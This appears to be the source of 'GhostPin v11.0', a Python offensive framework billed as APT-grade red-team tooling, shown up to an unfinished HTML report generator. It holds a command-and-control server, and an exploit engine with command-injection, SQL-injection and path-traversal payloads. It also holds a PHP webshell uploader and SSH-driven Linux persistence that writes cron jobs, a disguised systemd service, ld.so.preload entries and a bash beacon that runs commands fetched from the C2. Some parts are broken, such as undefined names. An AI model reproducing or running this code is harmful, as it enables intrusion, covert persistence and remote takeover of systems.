#!/usr/bin/env python3
#===============================================================================
# GhostPin v11.0 - APT-grade GPS Tracking & Reconnaissance Framework
# Professional Red Team Operations - Complete Version
# Author: F1REW0LF
# License: MIT
#===============================================================================

import sys
import os
import re
import json
import time
import random
import base64
import hashlib
import socket
import threading
import signal
import ssl
import subprocess
import argparse
import urllib.parse
import asyncio
import aiohttp
import platform
from datetime import datetime
from typing import Dict, List, Optional, Any, Tuple
from dataclasses import dataclass, field
from enum import Enum
from concurrent.futures import ThreadPoolExecutor, as_completed
import secrets
from abc import ABC, abstractmethod

# Third-party imports with graceful fallback
try:
    import requests
    REQUESTS_AVAILABLE = True
except ImportError:
    REQUESTS_AVAILABLE = False

try:
    from flask import Flask, request, jsonify, redirect, render_template_string
    FLASK_AVAILABLE = True
except ImportError:
    FLASK_AVAILABLE = False

try:
    import dns.resolver
    import dns.zone
    DNS_AVAILABLE = True
except ImportError:
    DNS_AVAILABLE = False

try:
    import nmap
    NMAP_AVAILABLE = True
except ImportError:
    NMAP_AVAILABLE = False

try:
    import shodan
    SHODAN_AVAILABLE = True
except ImportError:
    SHODAN_AVAILABLE = False

try:
    import whois
    WHOIS_AVAILABLE = True
except ImportError:
    WHOIS_AVAILABLE = False

try:
    from cryptography.fernet import Fernet
    from cryptography.hazmat.primitives import hashes
    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2
    CRYPTO_AVAILABLE = True
except ImportError:
    CRYPTO_AVAILABLE = False

try:
    import socks
    import stem
    from stem import Signal
    from stem.control import Controller
    TOR_AVAILABLE = True
except ImportError:
    TOR_AVAILABLE = False

try:
    from reportlab.lib import colors
    from reportlab.lib.pagesizes import letter, A4
    from reportlab.platypus import SimpleDocTemplate, Table, TableStyle, Paragraph, Spacer, Image
    from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
    from reportlab.lib.units import inch
    REPORTLAB_AVAILABLE = True
except ImportError:
    REPORTLAB_AVAILABLE = False

VERSION = "11.0.0"
AUTHOR = "F1REW0LF"
LICENSE = "MIT"

#===============================================================================
# COLORS
#===============================================================================

class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[0m'
    BOLD = '\033[1m'
    DIM = '\033[2m'

def cprint(text, color=Colors.WHITE, bold=False):
    if bold:
        print(f"{Colors.BOLD}{color}{text}{Colors.WHITE}")
    else:
        print(f"{color}{text}{Colors.WHITE}")

#===============================================================================
# UTILITY FUNCTIONS
#===============================================================================

def random_string(length: int = 8) -> str:
    """Generate random string"""
    return ''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=length))

def spoof_ip() -> str:
    """Generate spoofed IP"""
    return f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"

def generate_fingerprint() -> str:
    """Generate unique fingerprint"""
    return hashlib.sha256(f"{time.time()}{random.randint(1,999999)}{random_string(16)}".encode()).hexdigest()[:16]

def jitter_delay(base: int = 30) -> float:
    """Add jitter to delay"""
    return base * (1 + random.uniform(-0.3, 0.3))

#===============================================================================
# PROXY & TOR MANAGER
#===============================================================================

class ProxyManager:
    """Advanced proxy and Tor management"""
    
    def __init__(self):
        self.proxies = []
        self.tor_available = False
        self.current_proxy = None
        self.tor_controller = None
        self._init_tor()
    
    def _init_tor(self):
        """Initialize Tor connection"""
        if TOR_AVAILABLE:
            try:
                # Check if Tor is running
                with Controller.from_port(port=9051) as controller:
                    controller.authenticate()
                    self.tor_available = True
                    self.tor_controller = controller
                    cprint("[+] Tor available", Colors.GREEN)
            except:
                pass
    
    def get_session(self) -> requests.Session:
        """Get requests session with proxy"""
        session = requests.Session()
        session.headers.update({
            'User-Agent': random_ua(),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Cache-Control': 'no-cache'
        })
        
        if self.tor_available:
            session.proxies = {
                'http': 'socks5h://127.0.0.1:9050',
                'https': 'socks5h://127.0.0.1:9050'
            }
        elif self.proxies:
            proxy = random.choice(self.proxies)
            self.current_proxy = proxy
            session.proxies = {
                'http': f'http://{proxy}',
                'https': f'https://{proxy}'
            }
        
        return session
    
    def renew_tor_identity(self):
        """Renew Tor identity"""
        if self.tor_available and self.tor_controller:
            try:
                self.tor_controller.signal(Signal.NEWNYM)
                time.sleep(1)
                return True
            except:
                pass
        return False
    
    def add_proxy(self, proxy: str):
        """Add proxy to pool"""
        if proxy not in self.proxies:
            self.proxies.append(proxy)
    
    def load_proxies_from_file(self, filename: str):
        """Load proxies from file"""
        try:
            with open(filename, 'r') as f:
                for line in f:
                    proxy = line.strip()
                    if proxy and ':' in proxy:
                        self.add_proxy(proxy)
            cprint(f"[+] Loaded {len(self.proxies)} proxies", Colors.GREEN)
        except:
            pass

#===============================================================================
# TARGET PROFILE
#===============================================================================

@dataclass
class APTTargetProfile:
    """Comprehensive target profile for APT operations"""
    target: str
    ip_addresses: List[str] = field(default_factory=list)
    subdomains: List[str] = field(default_factory=list)
    domains: List[str] = field(default_factory=list)
    open_ports: List[int] = field(default_factory=list)
    services: Dict[int, Dict] = field(default_factory=dict)
    technologies: Dict[str, Any] = field(default_factory=dict)
    web_applications: List[Dict] = field(default_factory=list)
    vulnerabilities: List[Dict] = field(default_factory=list)
    cloud_resources: Dict[str, Any] = field(default_factory=dict)
    network_structure: Dict[str, Any] = field(default_factory=dict)
    certificates: List[Dict] = field(default_factory=list)
    whois_info: Dict[str, Any] = field(default_factory=dict)
    osint_data: Dict[str, Any] = field(default_factory=dict)
    attack_surface: Dict[str, Any] = field(default_factory=dict)
    gps_data: List[Dict] = field(default_factory=list)  # GPS tracking data
    last_updated: float = field(default_factory=time.time)

#===============================================================================
# C2 SERVER - COMPLETE
#===============================================================================

class C2Server:
    """Complete C2 server with command and control"""
    
    def __init__(self, host: str = "0.0.0.0", port: int = 8080):
        self.host = host
        self.port = port
        self.beacons = []
        self.commands = {}
        self.results = {}
        self.running = False
        self.server_thread = None
        self.stop_event = threading.Event()
        self.app = None
        self.encryption_key = None
        
        if CRYPTO_AVAILABLE:
            self._setup_encryption()
    
    def _setup_encryption(self):
        """Setup C2 encryption"""
        self.encryption_key = Fernet.generate_key()
        self.cipher = Fernet(self.encryption_key)
    
    def encrypt(self, data: str) -> str:
        """Encrypt C2 data"""
        if not CRYPTO_AVAILABLE:
            return base64.b64encode(data.encode()).decode()
        encrypted = self.cipher.encrypt(data.encode())
        return base64.b64encode(encrypted).decode()
    
    def decrypt(self, data: str) -> str:
        """Decrypt C2 data"""
        try:
            if not CRYPTO_AVAILABLE:
                return base64.b64decode(data).decode()
            decrypted = self.cipher.decrypt(base64.b64decode(data))
            return decrypted.decode()
        except:
            return data
    
    def start(self) -> bool:
        """Start C2 server"""
        if not FLASK_AVAILABLE:
            cprint("[!] Flask not installed", Colors.RED)
            return False
        
        cprint("[C2] Starting C2 server...", Colors.GREEN)
        self.running = True
        
        app = Flask(__name__)
        self.app = app
        
        @app.route('/beacon', methods=['POST'])
        def beacon():
            """Receive beacon from implant"""
            try:
                data = request.get_json()
                if data:
                    # Decrypt if needed
                    if 'encrypted' in data:
                        data = json.loads(self.decrypt(data['encrypted']))
                    
                    beacon_data = {
                        'host': data.get('host', 'unknown'),
                        'user': data.get('user', 'unknown'),
                        'timestamp': datetime.now().isoformat(),
                        'ip': request.remote_addr,
                        'os': data.get('os', 'unknown'),
                        'data': data
                    }
                    self.beacons.append(beacon_data)
                    cprint(f"[C2] Beacon from {beacon_data['host']}", Colors.GREEN)
                    
                    # Check for pending commands
                    if data.get('host') in self.commands:
                        cmd = self.commands[data['host']].pop(0)
                        return jsonify({'command': cmd})
                    
                    return jsonify({'status': 'ok'})
            except Exception as e:
                cprint(f"[C2] Beacon error: {e}", Colors.RED)
            return jsonify({'status': 'error'})
        
        @app.route('/command', methods=['POST'])
        def send_command():
            """Send command to implant"""
            try:
                data = request.get_json()
                host = data.get('host')
                command = data.get('command')
                
                if host and command:
                    if host not in self.commands:
                        self.commands[host] = []
                    self.commands[host].append(command)
                    cprint(f"[C2] Command sent to {host}: {command}", Colors.BLUE)
                    return jsonify({'status': 'ok'})
            except:
                pass
            return jsonify({'status': 'error'})
        
        @app.route('/result', methods=['POST'])
        def receive_result():
            """Receive command result"""
            try:
                data = request.get_json()
                if data:
                    host = data.get('host')
                    result = data.get('result')
                    if host not in self.results:
                        self.results[host] = []
                    self.results[host].append({
                        'timestamp': datetime.now().isoformat(),
                        'result': result
                    })
                    cprint(f"[C2] Result from {host}", Colors.GREEN)
                    return jsonify({'status': 'ok'})
            except:
                pass
            return jsonify({'status': 'error'})
        
        @app.route('/beacons', methods=['GET'])
        def get_beacons():
            """Get all beacons"""
            return jsonify(self.beacons[-100:])
        
        @app.route('/results/<host>', methods=['GET'])
        def get_results(host):
            """Get results for host"""
            return jsonify(self.results.get(host, []))
        
        @app.route('/stats', methods=['GET'])
        def get_stats():
            """Get C2 stats"""
            return jsonify({
                'beacons': len(self.beacons),
                'hosts': len(set(b.get('host') for b in self.beacons)),
                'commands': sum(len(cmds) for cmds in self.commands.values()),
                'results': sum(len(rs) for rs in self.results.values()),
                'running': self.running
            })
        
        def run_server():
            app.run(host=self.host, port=self.port, debug=False, threaded=True, use_reloader=False)
        
        self.server_thread = threading.Thread(target=run_server, daemon=True)
        self.server_thread.start()
        time.sleep(1)
        
        cprint(f"[C2] Server listening on {self.host}:{self.port}", Colors.GREEN)
        return True
    
    def stop(self):
        """Stop C2 server"""
        self.running = False
        self.stop_event.set()
        if self.server_thread:
            self.server_thread.join(timeout=5)
        cprint("[C2] Server stopped", Colors.RED)

#===============================================================================
# REAL EXPLOITATION ENGINE
#===============================================================================

class RealExploitEngine:
    """Real exploitation with actual RCE, SQLi, LFI"""
    
    def __init__(self, profile: APTTargetProfile):
        self.profile = profile
        self.proxy_manager = ProxyManager()
        self.results = []
        self.webshells = []
        
    def exploit_rce(self, url: str, param: str, cmd: str = "id") -> Dict:
        """Real RCE exploitation"""
        cprint(f"[RCE] Exploiting {url}", Colors.RED)
        
        result = {'success': False, 'url': url, 'command': cmd, 'output': ''}
        
        # Command injection payloads
        payloads = [
            f'; {cmd}',
            f'| {cmd}',
            f'|| {cmd}',
            f'&& {cmd}',
            f'& {cmd}',
            f'`{cmd}`',
            f'$({cmd})',
            f'$(echo {base64.b64encode(cmd.encode()).decode()} | base64 -d | bash)'
        ]
        
        session = self.proxy_manager.get_session()
        
        for payload in payloads:
            try:
                test_url = f"{url}?{param}={urllib.parse.quote(payload)}"
                response = session.get(test_url, timeout=10, verify=False)
                
                if response.status_code == 200:
                    # Check for command output
                    output_lower = response.text.lower()
                    if 'uid=' in output_lower or 'id=' in output_lower or 'root' in output_lower:
                        result['success'] = True
                        result['output'] = response.text[:1000]
                        result['payload'] = payload
                        cprint(f"[+] RCE successful: {cmd}", Colors.GREEN)
                        break
            except:
                pass
        
        self.results.append(result)
        return result
    
    def exploit_sqli(self, url: str, param: str) -> Dict:
        """Real SQL Injection with data extraction"""
        cprint(f"[SQLi] Exploiting {url}", Colors.RED)
        
        result = {'success': False, 'url': url, 'data': [], 'tables': []}
        session = self.proxy_manager.get_session()
        
        # Union-based SQLi payloads
        payloads = [
            f"' UNION SELECT table_name, NULL FROM information_schema.tables--",
            f"' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users'--",
            f"' UNION SELECT username, password FROM users--",
            f"' UNION SELECT @@version, NULL--"
        ]
        
        for payload in payloads:
            try:
                test_url = f"{url}?{param}={urllib.parse.quote(payload)}"
                response = session.get(test_url, timeout=10, verify=False)
                
                if response.status_code == 200:
                    # Extract data from response
                    data = self._extract_sqli_data(response.text)
                    if data:
                        result['data'].extend(data)
                        result['success'] = True
                        cprint(f"[+] SQLi data extracted: {len(data)} records", Colors.GREEN)
                        break
            except:
                pass
        
        self.results.append(result)
        return result
    
    def _extract_sqli_data(self, text: str) -> List[Dict]:
        """Extract data from SQLi response"""
        data = []
        lines = text.split('\n')
        for line in lines:
            if 'admin' in line.lower() or 'password' in line.lower() or 'user' in line.lower():
                # Try to extract key:value pairs
                parts = re.findall(r'(\w+):\s*(\S+)', line)
                if parts:
                    data.append(dict(parts))
                else:
                    data.append({'raw': line.strip()})
        return data
    
    def exploit_lfi(self, url: str, param: str, file_path: str = '/etc/passwd') -> Dict:
        """Real LFI with file reading"""
        cprint(f"[LFI] Exploiting {url}", Colors.RED)
        
        result = {'success': False, 'url': url, 'content': '', 'file': file_path}
        session = self.proxy_manager.get_session()
        
        # LFI payloads
        payloads = [
            f'../../../../{file_path}',
            f'../../../{file_path}',
            f'../../{file_path}',
            f'....//....//....//{file_path}',
            f'../../../../../../{file_path}'
        ]
        
        for payload in payloads:
            try:
                test_url = f"{url}?{param}={urllib.parse.quote(payload)}"
                response = session.get(test_url, timeout=10, verify=False)
                
                if response.status_code == 200 and len(response.text) > 100:
                    if 'root:' in response.text or 'bin:' in response.text:
                        result['success'] = True
                        result['content'] = response.text[:2000]
                        result['payload'] = payload
                        cprint(f"[+] LFI successful: {file_path}", Colors.GREEN)
                        break
            except:
                pass
        
        self.results.append(result)
        return result
    
    def upload_webshell(self, target: str, port: int = 80) -> Dict:
        """Real webshell upload"""
        cprint(f"[WEBSHELL] Uploading to {target}:{port}", Colors.PURPLE)
        
        result = {'success': False, 'target': target, 'url': ''}
        session = self.proxy_manager.get_session()
        
        # Common upload endpoints
        upload_paths = [
            '/upload',
            '/uploads',
            '/file',
            '/files',
            '/media',
            '/image',
            '/api/upload',
            '/admin/upload',
            '/wp-admin/admin-ajax.php',
            '/index.php?route=common/filemanager/upload'
        ]
        
        # PHP webshell
        shell_code = '''<?php
if(isset($_GET['cmd'])){
    $cmd = $_GET['cmd'];
    if(function_exists('system')){
        system($cmd);
    } elseif(function_exists('exec')){
        exec($cmd, $output);
        echo implode("\\n", $output);
    } elseif(function_exists('shell_exec')){
        echo shell_exec($cmd);
    } elseif(function_exists('passthru')){
        passthru($cmd);
    } elseif(function_exists('popen')){
        $handle = popen($cmd, 'r');
        while(!feof($handle)){
            echo fread($handle, 1024);
        }
        pclose($handle);
    }
}
?>'''
        
        protocol = 'https' if port in [443, 8443] else 'http'
        base_url = f"{protocol}://{target}:{port}"
        
        for upload_path in upload_paths:
            try:
                url = f"{base_url}{upload_path}"
                
                # Try multipart form upload
                files = {'file': (f'shell_{random_string(6)}.php', shell_code, 'application/x-php')}
                response = session.post(url, files=files, timeout=10, verify=False)
                
                if response.status_code in [200, 201, 202, 302]:
                    # Try to find uploaded file
                    for ext in ['php', 'php5', 'phtml', 'php7']:
                        test_url = f"{base_url}/shell_{random_string(6)}.{ext}"
                        resp = session.get(test_url, timeout=5, verify=False)
                        if resp.status_code == 200:
                            result['success'] = True
                            result['url'] = test_url
                            result['shell_type'] = ext
                            self.webshells.append(test_url)
                            cprint(f"[+] Webshell uploaded: {test_url}", Colors.GREEN)
                            return result
            except:
                pass
        
        return result

#===============================================================================
# ENHANCED PERSISTENCE
#===============================================================================

class EnhancedPersistence:
    """Enhanced cross-platform persistence with C2 integration"""
    
    def __init__(self, c2_server: C2Server = None):
        self.c2_server = c2_server
        self.deployed = []
        
    def deploy_linux(self, target: str, username: str, password: str, payload: str) -> Dict:
        """Linux persistence with 8 methods"""
        result = {'success': False, 'platform': 'Linux', 'target': target, 'methods': []}
        
        methods = [
            self._deploy_cron,
            self._deploy_systemd,
            self._deploy_bashrc,
            self._deploy_ssh_key,
            self._deploy_ld_preload,
            self._deploy_profile,
            self._deploy_c2_beacon,
            self._deploy_udev_rule
        ]
        
        for method in methods:
            try:
                method_result = method(target, username, password, payload)
                if method_result.get('success'):
                    result['methods'].append(method_result['technique'])
                    result['success'] = True
            except:
                pass
        
        if result['success']:
            self.deployed.append(result)
            cprint(f"[+] Linux persistence: {len(result['methods'])} methods", Colors.GREEN)
        
        return result
    
    def _deploy_cron(self, target: str, username: str, password: str, payload: str) -> Dict:
        """Cron persistence"""
        result = {'success': False, 'technique': 'cron'}
        try:
            if not PARAMIKO_AVAILABLE:
                return result
            
            import paramiko
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(target, username=username, password=password, timeout=10)
            
            # Multiple cron entries for redundancy
            crons = [
                f"* * * * * {payload}",
                f"*/5 * * * * {payload}",
                f"@reboot {payload}"
            ]
            
            for cron in crons:
                ssh.exec_command(f'(crontab -l 2>/dev/null; echo "{cron}") | crontab -')
            
            ssh.close()
            result['success'] = True
            cprint("[+] Cron persistence deployed", Colors.GREEN)
        except:
            pass
        return result
    
    def _deploy_systemd(self, target: str, username: str, password: str, payload: str) -> Dict:
        """Systemd service persistence"""
        result = {'success': False, 'technique': 'systemd'}
        try:
            if not PARAMIKO_AVAILABLE:
                return result
            
            import paramiko
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(target, username=username, password=password, timeout=10)
            
            service_name = f"system-update-{random.randint(1000, 9999)}"
            service_content = f"""[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
ExecStart={payload}
Restart=always
RestartSec=30

[Install]
WantedBy=multi-user.target"""
            
            ssh.exec_command(f'echo "{service_content}" > /etc/systemd/system/{service_name}.service')
            ssh.exec_command(f'systemctl daemon-reload')
            ssh.exec_command(f'systemctl enable {service_name}.service')
            ssh.exec_command(f'systemctl start {service_name}.service')
            ssh.close()
            
            result['success'] = True
            result['service'] = service_name
            cprint("[+] Systemd persistence deployed", Colors.GREEN)
        except:
            pass
        return result
    
    def _deploy_bashrc(self, target: str, username: str, password: str, payload: str) -> Dict:
        """.bashrc persistence"""
        result = {'success': False, 'technique': 'bashrc'}
        try:
            if not PARAMIKO_AVAILABLE:
                return result
            
            import paramiko
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(target, username=username, password=password, timeout=10)
            
            ssh.exec_command(f'echo "{payload}" >> ~/.bashrc')
            ssh.exec_command(f'echo "{payload}" >> ~/.bash_profile')
            ssh.exec_command(f'echo "{payload}" >> ~/.profile')
            ssh.close()
            
            result['success'] = True
            cprint("[+] .bashrc persistence deployed", Colors.GREEN)
        except:
            pass
        return result
    
    def _deploy_ssh_key(self, target: str, username: str, password: str) -> Dict:
        """SSH key persistence"""
        result = {'success': False, 'technique': 'ssh_key'}
        try:
            if not PARAMIKO_AVAILABLE:
                return result
            
            import paramiko
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(target, username=username, password=password, timeout=10)
            
            # Generate SSH key
            key = paramiko.RSAKey.generate(2048)
            pub_key = f"ssh-rsa {key.get_base64()} {username}@{target}"
            
            ssh.exec_command('mkdir -p ~/.ssh')
            ssh.exec_command(f'echo "{pub_key}" >> ~/.ssh/authorized_keys')
            ssh.exec_command('chmod 600 ~/.ssh/authorized_keys')
            ssh.exec_command('chmod 700 ~/.ssh')
            ssh.close()
            
            result['success'] = True
            result['public_key'] = pub_key
            result['private_key'] = key.get_base64()
            cprint("[+] SSH key persistence deployed", Colors.GREEN)
        except:
            pass
        return result
    
    def _deploy_ld_preload(self, target: str, username: str, password: str, payload: str) -> Dict:
        """LD_PRELOAD persistence"""
        result = {'success': False, 'technique': 'ld_preload'}
        try:
            if not PARAMIKO_AVAILABLE:
                return result
            
            import paramiko
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(target, username=username, password=password, timeout=10)
            
            ssh.exec_command(f'echo "{payload}" > /etc/ld.so.preload')
            ssh.close()
            
            result['success'] = True
            cprint("[+] LD_PRELOAD persistence deployed", Colors.GREEN)
        except:
            pass
        return result
    
    def _deploy_profile(self, target: str, username: str, password: str, payload: str) -> Dict:
        """Profile persistence"""
        result = {'success': False, 'technique': 'profile'}
        try:
            if not PARAMIKO_AVAILABLE:
                return result
            
            import paramiko
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(target, username=username, password=password, timeout=10)
            
            profiles = ['~/.profile', '~/.bash_profile', '~/.bash_login', '~/.zshrc']
            for profile in profiles:
                ssh.exec_command(f'echo "{payload}" >> {profile}')
            ssh.close()
            
            result['success'] = True
            cprint("[+] Profile persistence deployed", Colors.GREEN)
        except:
            pass
        return result
    
    def _deploy_c2_beacon(self, target: str, username: str, password: str, payload: str) -> Dict:
        """C2 beacon persistence"""
        result = {'success': False, 'technique': 'c2_beacon'}
        
        if not self.c2_server:
            return result
        
        try:
            if not PARAMIKO_AVAILABLE:
                return result
            
            import paramiko
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(target, username=username, password=password, timeout=10)
            
            c2_url = f"http://{self.c2_server.host}:{self.c2_server.port}"
            beacon_script = f'''#!/bin/bash
# C2 Beacon
C2_URL="{c2_url}"
while true; do
    # Send beacon
    curl -s -X POST "$C2_URL/beacon" \\
        -H "Content-Type: application/json" \\
        -d '{{"host":"$(hostname)","user":"$(whoami)","os":"$(uname -a)","timestamp":"$(date -Iseconds)"}}' &
    
    # Check for commands
    RESPONSE=$(curl -s -X GET "$C2_URL/command?host=$(hostname)")
    if [ "$RESPONSE" != "null" ] && [ ! -z "$RESPONSE" ]; then
        eval "$RESPONSE"
        curl -s -X POST "$C2_URL/result" \\
            -H "Content-Type: application/json" \\
            -d '{{"host":"$(hostname)","result":"$RESPONSE"}}'
    fi
    
    sleep 60
done
'''
            
            ssh.exec_command(f'echo "{beacon_script}" > /usr/local/bin/c2_beacon.sh')
            ssh.exec_command('chmod +x /usr/local/bin/c2_beacon.sh')
            
            # Add to crontab for persistence
            ssh.exec_command('(crontab -l 2>/dev/null; echo "@reboot /usr/local/bin/c2_beacon.sh") | crontab -')
            ssh.close()
            
            result['success'] = True
            cprint("[+] C2 beacon persistence deployed", Colors.GREEN)
        except:
            pass
        return result
    
    def _deploy_udev_rule(self, target: str, username: str, password: str, payload: str) -> Dict:
        """UDEV rule persistence"""
        result = {'success': False, 'technique': 'udev'}
        try:
            if not PARAMIKO_AVAILABLE:
                return result
            
            import paramiko
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(target, username=username, password=password, timeout=10)
            
            udev_rule = f'SUBSYSTEM=="net", ACTION=="add", RUN+="{payload}"'
            ssh.exec_command(f'echo "{udev_rule}" > /etc/udev/rules.d/99-persist.rules')
            ssh.exec_command('udevadm control --reload-rules')
            ssh.close()
            
            result['success'] = True
            cprint("[+] UDEV rule persistence deployed", Colors.GREEN)
        except:
            pass
        return result

#===============================================================================
# ENHANCED REPORTING
#===============================================================================

class EnhancedReporting:
    """Enhanced reporting with PDF, HTML, and GPS maps"""
    
    def __init__(self):
        self.data = {}
    
    def generate_pdf(self, data: Dict, filename: str = "apt_report.pdf") -> bool:
        """Generate PDF report with maps"""
        try:
            if not REPORTLAB_AVAILABLE:
                cprint("[!] ReportLab not installed", Colors.YELLOW)
                return False
            
            doc = SimpleDocTemplate(filename, pagesize=A4)
            styles = getSampleStyleSheet()
            story = []
            
            # Title
            title = Paragraph("APT Operations Report", styles['Title'])
            story.append(title)
            story.append(Spacer(1, 12))
            
            # Summary
            summary_text = f"""
            <para>
            <b>Timestamp:</b> {data.get('timestamp', 'N/A')}<br/>
            <b>Version:</b> {data.get('version', 'N/A')}<br/>
            <b>Author:</b> {data.get('author', 'N/A')}<br/>
            <b>Target:</b> {data.get('target', 'N/A')}<br/>
            <b>Subdomains:</b> {len(data.get('subdomains', []))}<br/>
            <b>Open Ports:</b> {len(data.get('open_ports', []))}<br/>
            <b>Services:</b> {len(data.get('services', {}))}<br/>
            <b>Vulnerabilities:</b> {len(data.get('vulnerabilities', []))}<br/>
            <b>GPS Data Points:</b> {len(data.get('gps_data', []))}
            </para>
            """
            story.append(Paragraph(summary_text, styles['Normal']))
            story.append(Spacer(1, 12))
            
            # GPS Data Table
            if data.get('gps_data'):
                gps_data = [['Token', 'Latitude', 'Longitude', 'Accuracy', 'Timestamp']]
                for gps in data['gps_data'][-20:]:
                    gps_data.append([
                        gps.get('token', 'N/A')[:8],
                        str(gps.get('lat', 'N/A')),
                        str(gps.get('lng', 'N/A')),
                        str(gps.get('accuracy', 'N/A')),
                        gps.get('timestamp', 'N/A')[:19]
                    ])
                
                gps_table = Table(gps_data)
                gps_table.setStyle(TableStyle([
                    ('BACKGROUND', (0, 0), (-1, 0), colors.grey),
                    ('TEXTCOLOR', (0, 0), (-1, 0), colors.whitesmoke),
                    ('ALIGN', (0, 0), (-1, -1), 'CENTER'),
                    ('FONTNAME', (0, 0), (-1, 0), 'Helvetica-Bold'),
                    ('FONTSIZE', (0, 0), (-1, 0), 10),
                    ('BOTTOMPADDING', (0, 0), (-1, 0), 8),
                    ('BACKGROUND', (0, 1), (-1, -1), colors.beige),
                    ('GRID', (0, 0), (-1, -1), 1, colors.black)
                ]))
                
                story.append(Paragraph("GPS Tracking Data", styles['Heading2']))
                story.append(gps_table)
                story.append(Spacer(1, 12))
            
            # Attack Surface
            attack_surface = data.get('attack_surface', {})
            if attack_surface:
                surface_data = [['Type', 'Details']]
                for key, value in attack_surface.items():
                    if isinstance(value, list):
                        for item in value[:5]:
                            if isinstance(item, dict):
                                details = ', '.join([f"{k}:{v}" for k, v in item.items()][:3])
                            else:
                                details = str(item)
                            surface_data.append([key.replace('_', ' ').title(), details])
                    else:
                        surface_data.append([key.replace('_', ' ').title(), str(value)[:50]])
                
                surface_table = Table(surface_data)
                surface_table.setStyle(TableStyle([
                    ('BACKGROUND', (0, 0), (-1, 0), colors.grey),
                    ('TEXTCOLOR', (0, 0), (-1, 0), colors.whitesmoke),
                    ('FONTNAME', (0, 0), (-1, 0), 'Helvetica-Bold'),
                    ('GRID', (0, 0), (-1, -1), 1, colors.black)
                ]))
                
                story.append(Paragraph("Attack Surface", styles['Heading2']))
                story.append(surface_table)
            
            doc.build(story)
            return True
        except Exception as e:
            cprint(f"[-] PDF generation failed: {e}", Colors.RED)
            return False
    
    def generate_html(self, data: Dict, filename: str = "apt_report.html") -> bool:
        """Generate HTML report with Google Maps integration"""
        try:
            # Generate Google Maps if GPS data exists
            maps_html = ""
            if data.get('gps_data'):
                markers = []
                for gps in data['gps_data'][-10:]:
                    if gps.get('lat') and gps.get('lng'):
                        markers.append(f"new google.maps.Marker({{position: {{lat: {gps['lat']}, lng: {gps['lng']}}}, title: '{gps.get('token', '')}'}})")
                
                if markers:
                    maps_html = f"""
                    <div id="map" style="height:400px;width:100%;"></div>
                    <script>
                    function initMap() {{
                        var map = new google.maps.Map(document.getElementById('map'), {{
                            zoom: 8,
                            center: {{lat: {data['gps_data'][-1].get('lat', 0)}, lng: {data['gps_data'][-1].get('lng', 0)}}}
                        }});
                        {chr(10).join(markers)}
                    }}
                    </script>
                    <script async defer src="https://maps.googleapis.com/maps/api/js?key=YOUR_API_KEY&callback=initMap"></script>
                    """
            
            html = f"""
<!DOCTYPE html>
<html>
<head>
    <title>APT Operations Report</title>
    <style>
        body {{ font-family: Arial, sans-serif; margin: 20px; background: #f5f5f5; }}
        .container {{ max-width: 1200px; margin: 0 auto; background: white; padding: 20px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }}
        h1 {{ color: #333; border-bottom: 3px solid #4CAF50; padding-bottom: 10px; }}
        h2 {{ color: #666; margin-top: 20px; }}
        table {{ border-collapse: collapse; width: 100%; margin: 10px 0; }}
        th, td {{ border: 1px solid #ddd; padding: 8px; text-align: left; }}
        th {{ background-color: #4CAF50; color: white; }}
        tr:nth-child(even) {{ background-color: #f2f2f2; }}
        .success {{ color: green; font-weight: bold; }}
        .critical {{ color: red; font-weight: bold; }}
        .high {{ color: orange; font-weight: bold; }}
        .summary {{ background-color: #e8f5e9; padding: 15px; border-radius: 5px; margin: 10px 0; }}
        .vuln {{ background-color: #ffebee; padding: 10px; margin: 5px 0; border-left: 3px solid red; }}
        .info {{ background-color: #e3f2fd; padding: 10px; margin: 5px 0; border-left: 3px solid blue; }}
        .gps {{ background-color: #f3e5f5; padding: 10px; margin: 5px 0; border-left: 3px solid purple; }}
    </style>
</head>
<body>
    <div class="container">
        <h1>APT Operations Report</h1>
        
        <div class="summary">
            <h3>Summary</h3>
            <p><strong>Timestamp:</strong> {data.get('timestamp', 'N/A')}</p>
            <p><strong>Version:</strong> {data.get('version', 'N/A')}</p>
            <p><strong>Target:</strong> {data.get('target', 'N/A')}</p>
            <p><strong>Subdomains:</strong> {len(data.get('subdomains', []))}</p>
            <p><strong>Open Ports:</strong> {len(data.get('open_ports', []))}</p>
            <p><strong>Services:</strong> {len(data.get('services', {}))}</p>
            <p><strong>Vulnerabilities:</strong> {len(data.get('vulnerabilities', []))}</p>
            <p><strong>GPS Data Points:</strong> {len(data.get('gps_data', []))}</p>
        </div>
        
        <h2>GPS Tracking Data</h2>
        {maps_html if maps_html else '<p>No GPS data available</p>'}
        <table>
            <tr>
                <th>Token</th>
                <th>Latitude</th>
                <th>Longitude</th>
                <th>Accuracy</th>
                <th>Timestamp</th>
            </tr>
            {''.join([
                f'<tr><td>{gps.get("token", "N/A")[:8]}</td>'
                f'<td>{gps.get("lat", "N/A")}</td>'
                f'<td>{gps.get("lng", "N/A")}</td>'
                f'<td>{gps.get("accuracy", "N/A")}</td>'
